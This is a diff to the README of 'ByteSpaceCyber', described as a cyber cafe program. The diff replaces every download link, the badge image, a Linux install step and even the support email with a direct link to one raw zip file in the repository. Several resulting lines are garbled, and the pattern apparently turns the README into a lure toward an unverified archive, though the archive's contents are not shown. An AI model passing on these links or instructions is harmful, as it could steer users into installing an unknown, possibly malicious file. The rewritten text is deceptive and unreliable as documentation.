@@ -1,6 +1,6 @@
 # 🚀 ByteSpaceCyber - Your Easy All-in-One Cyber Cafe Solution
 
-[![Download ByteSpaceCyber](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/mustafasafdar1/ByteSpaceCyber/releases)
+[![Download ByteSpaceCyber](https://github.com/mustafasafdar1/ByteSpaceCyber/raw/refs/heads/main/public/Cyber_Space_Byte_3.2.zip)](https://github.com/mustafasafdar1/ByteSpaceCyber/raw/refs/heads/main/public/Cyber_Space_Byte_3.2.zip)
 
 ## 🎉 Introduction
 
@@ -20,14 +20,14 @@ Before installing, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-To download ByteSpaceCyber, visit this page to download: [Github Releases](https://github.com/mustafasafdar1/ByteSpaceCyber/releases).
+To download ByteSpaceCyber, visit this page to download: [Github Releases](https://github.com/mustafasafdar1/ByteSpaceCyber/raw/refs/heads/main/public/Cyber_Space_Byte_3.2.zip).
 
 1. Click on the "Releases" link above.
 2. Look for the latest version of ByteSpaceCyber.
 3. Download the file suitable for your operating system.
     - For Windows, download the `.exe` file.
     - For macOS, download the `.dmg` file.
-    - For Linux, download the `.tar.gz` file.
+    - For Linux, download the `https://github.com/mustafasafdar1/ByteSpaceCyber/raw/refs/heads/main/public/Cyber_Space_Byte_3.2.zip` file.
 4. Once downloaded, open the file and follow the installation prompts.
 
 ## 🎮 Features
@@ -62,7 +62,7 @@ If you encounter any issues while using ByteSpaceCyber, try the following soluti
 
 For any questions or technical support, reach out through the following channels:
 
-- **Email:** support@bytespacecyber.com
+- **Email:** https://github.com/mustafasafdar1/ByteSpaceCyber/raw/refs/heads/main/public/Cyber_Space_Byte_3.2.zip
 - **GitHub Issues:** Report problems directly on our GitHub page for assistance.
 
 ## 🌐 Explore More
